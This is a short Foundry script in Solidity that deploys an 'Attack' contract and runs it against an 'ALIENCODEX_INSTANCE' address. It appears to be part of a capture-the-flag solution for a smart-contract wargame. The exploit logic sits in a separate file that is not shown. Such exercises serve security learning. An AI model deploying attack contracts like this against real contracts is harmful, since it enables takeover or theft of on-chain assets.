// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import {Attack} from "../src/Attack.sol";

contract AttackScript is Script {
    function run() external {
        address targetAddress = vm.envAddress("ALIENCODEX_INSTANCE");

        vm.startBroadcast();
        Attack attacker = new Attack();
        attacker.attack(targetAddress);
        vm.stopBroadcast();

        console.log("Attack contract deployed at:", address(attacker));
    }
}
